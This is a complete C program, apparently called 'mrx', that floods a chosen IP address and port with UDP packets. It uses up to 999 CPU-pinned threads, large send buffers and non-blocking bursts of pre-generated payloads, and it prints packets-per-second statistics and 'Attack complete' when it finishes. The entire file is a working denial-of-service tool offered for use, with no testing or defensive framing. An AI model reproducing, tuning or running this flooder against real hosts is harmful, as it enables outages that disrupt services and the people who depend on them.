#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int ready_signal = 0;
_Atomic int stop_signal = 0;

#define PREGEN_COUNT 256
char *pregen_buffers[PREGEN_COUNT];
struct sockaddr_in target_addr;

typedef struct {
    uint32_t timestamp;
    uint16_t packet_id;
    uint8_t packet_type;
    uint8_t flags;
    uint32_t sequence;
    uint16_t checksum;
} udp_header_t;

void lock_cpu(int thread_id) {
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    int cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpu_count > 0) {
        CPU_SET(thread_id % cpu_count, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
}

uint32_t fast_rand(uint64_t *state) {
    *state = (*state * 1103515245 + 12345) & 0x7FFFFFFF;
    return (uint32_t)*state;
}

void init_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        pregen_buffers[i] = malloc(PACKET_SIZE);
        if (!pregen_buffers[i]) {
            perror("Buffer allocation failed");
            exit(1);
        }
        
        udp_header_t *hdr = (udp_header_t *)pregen_buffers[i];
        hdr->packet_type = 0xA1;
        hdr->flags = 0xC3;
        
        uint32_t pattern = i * 0x9E3779B9;
        for (int j = sizeof(udp_header_t); j < PACKET_SIZE; j++) {
            pregen_buffers[i][j] = (char)((pattern + j) & 0xFF);
            pattern = (pattern << 1) | (pattern >> 31);
        }
    }
}

void cleanup_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        if (pregen_buffers[i]) {
            free(pregen_buffers[i]);
        }
    }
}

int create_optimized_socket() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return -1;
    }
    
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    
    int sndbuf = 200 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 1000;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    char warmup[1024];
    memset(warmup, 0xFF, sizeof(warmup));
    sendto(sockfd, warmup, PACKET_SIZE < sizeof(warmup) ? PACKET_SIZE : sizeof(warmup), 0,
          (struct sockaddr *)&target_addr, sizeof(target_addr));
    
    return sockfd;
}

void *attack_thread(void *arg) {
    int thread_id = *(int *)arg;
    lock_cpu(thread_id);
    
    int sockfd = create_optimized_socket();
    if (sockfd < 0) pthread_exit(NULL);
    
    char prewarm[1024];
    memset(prewarm, 0xAA, sizeof(prewarm));
    for (int i = 0; i < 5; i++) {
        sendto(sockfd, prewarm, PACKET_SIZE < sizeof(prewarm) ? PACKET_SIZE : sizeof(prewarm), MSG_DONTWAIT,
              (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(100);
    }
    
    while (!ready_signal) {
        char keepalive[1024];
        memset(keepalive, 0xCC, sizeof(keepalive));
        sendto(sockfd, keepalive, PACKET_SIZE < sizeof(keepalive) ? PACKET_SIZE : sizeof(keepalive), MSG_DONTWAIT,
              (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(500);
    }
    
    time_t start_time = time(NULL);
    int packet_index = thread_id % PREGEN_COUNT;
    uint64_t rand_state = time(NULL) + thread_id;
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    
    int burst_size = 64;
    if (PACKET_SIZE < 100) burst_size = 128;
    
    while (!stop_signal) {
        if (time(NULL) - start_time >= ATTACK_TIME) break;
        
        for (int i = 0; i < burst_size; i++) {
            if (!pregen_buffers[packet_index]) {
                char temp_packet[PACKET_SIZE];
                for (int j = 0; j < PACKET_SIZE; j++) {
                    temp_packet[j] = (char)(fast_rand(&rand_state) & 0xFF);
                }
                
                if (sendto(sockfd, temp_packet, PACKET_SIZE, MSG_DONTWAIT,
                          (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                }
            } else {
                udp_header_t *hdr = (udp_header_t *)pregen_buffers[packet_index];
                hdr->timestamp = (uint32_t)time(NULL);
                hdr->packet_id = thread_id;
                hdr->sequence = local_packets;
                hdr->checksum = (hdr->timestamp ^ hdr->sequence) & 0xFFFF;
                
                sendto(sockfd, pregen_buffers[packet_index], PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&target_addr, sizeof(target_addr));
            }
            
            local_packets++;
            packet_index = (packet_index + 1) % PREGEN_COUNT;
            
            if (i % 32 == 0) {
                sched_yield();
            }
        }
        
        local_bytes += burst_size * PACKET_SIZE;
        
        if (local_packets >= 10000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    atomic_fetch_add(&total_packets, local_packets);
    atomic_fetch_add(&total_bytes, local_bytes);
    
    close(sockfd);
    pthread_exit(NULL);
}

void *stats_monitor(void *arg) {
    sleep(3);
    
    unsigned long long prev_packets = 0;
    unsigned long long prev_bytes = 0;
    
    for (int second = 1; second <= ATTACK_TIME && !stop_signal; second++) {
        sleep(1);
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = current_packets - prev_packets;
        unsigned long long bps = current_bytes - prev_bytes;
        
        prev_packets = current_packets;
        prev_bytes = current_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        printf("[%03ds] PPS: %5lluK | Peak: %5lluK\n", 
               second, pps / 1000, atomic_load(&peak_pps) / 1000);
        fflush(stdout);
    }
    
    pthread_exit(NULL);
}

void usage() {
    printf("Usage: ./mrx IP PORT TIME SIZE THREADS\n");
    printf("Example: ./mrx 1.2.3.4 7777 60 64 500\n");
    printf("Time: 10-300s | Size: 10-1024 | Threads: 1-999\n");
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage();
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || ATTACK_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        printf("Invalid parameters\n");
        usage();
        return 1;
    }
    
    if (PACKET_SIZE > 1024) PACKET_SIZE = 1024;
    if (PACKET_SIZE < 10) PACKET_SIZE = 10;
    if (THREAD_COUNT > 999) THREAD_COUNT = 999;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    if (target_addr.sin_addr.s_addr == INADDR_NONE) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n\n", PACKET_SIZE, THREAD_COUNT);
    
    init_pregen_buffers();
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *thread_ids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !thread_ids) {
        perror("Memory allocation failed");
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]) != 0) {
            perror("Thread creation failed");
            break;
        }
        
        if (i % 50 == 0 && i > 0) {
            usleep(10000);
        }
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(2);
    ready_signal = 1;
    
    sleep(ATTACK_TIME);
    stop_signal = 1;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_peak = atomic_load(&peak_pps);
    
    printf("\nAttack complete\n");
    printf("Total packets: %llu\n", final_packets);
    printf("Total data: %.2f MB\n", final_bytes / (1024.0 * 1024.0));
    printf("Peak PPS: %lluK\n", final_peak / 1000);
    
    cleanup_pregen_buffers();
    free(threads);
    free(thread_ids);
    
    return 0;
}